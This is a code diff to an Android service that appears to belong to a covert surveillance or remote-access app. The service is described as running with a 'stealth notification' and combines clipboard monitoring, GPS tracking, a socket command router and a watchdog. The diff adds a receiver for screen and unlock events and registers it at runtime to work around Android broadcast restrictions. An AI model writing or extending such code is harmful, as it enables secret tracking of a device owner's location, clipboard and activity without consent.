@@ -21,6 +21,7 @@ import com.fason.app.core.network.SocketClient;
 import com.fason.app.core.network.SocketCommandRouter;
 import com.fason.app.features.clipboard.ClipboardMonitor;
 import com.fason.app.features.gps.GpsManager;
+import com.fason.app.receiver.ScreenStateReceiver;
 import com.fason.app.receiver.WatchdogReceiver;
 
 /** Main foreground service with stealth notification. */
@@ -34,6 +35,7 @@ public class MainService extends Service {
 
     private ClipboardMonitor clipMonitor;
     private GpsManager locManager;
+    private ScreenStateReceiver screenStateReceiver;
     private int currentType = 0;
 
     @Override
@@ -59,6 +61,15 @@ public class MainService extends Service {
         WatchdogReceiver.setServiceActive(this, true);
         clipMonitor = ClipboardMonitor.getInstance(this);
         clipMonitor.start();
+
+        // Dynamically register ScreenStateReceiver – manifest-declared
+        // SCREEN_ON/OFF/USER_PRESENT broadcasts are blocked since API 24.
+        screenStateReceiver = new ScreenStateReceiver();
+        android.content.IntentFilter filter = new android.content.IntentFilter();
+        filter.addAction(Intent.ACTION_SCREEN_ON);
+        filter.addAction(Intent.ACTION_SCREEN_OFF);
+        filter.addAction(Intent.ACTION_USER_PRESENT);
+        registerReceiver(screenStateReceiver, filter);
         try {
             locManager = new GpsManager(this);
         } catch (Exception ignored) {}
@@ -194,6 +205,10 @@ public class MainService extends Service {
 
     @Override
     public void onDestroy() {
+        if (screenStateReceiver != null) {
+            try { unregisterReceiver(screenStateReceiver); } catch (Exception ignored) {}
+            screenStateReceiver = null;
+        }
         if (clipMonitor != null) clipMonitor.shutdown();
         if (locManager != null) locManager.stop();
         SocketCommandRouter.shutdown();
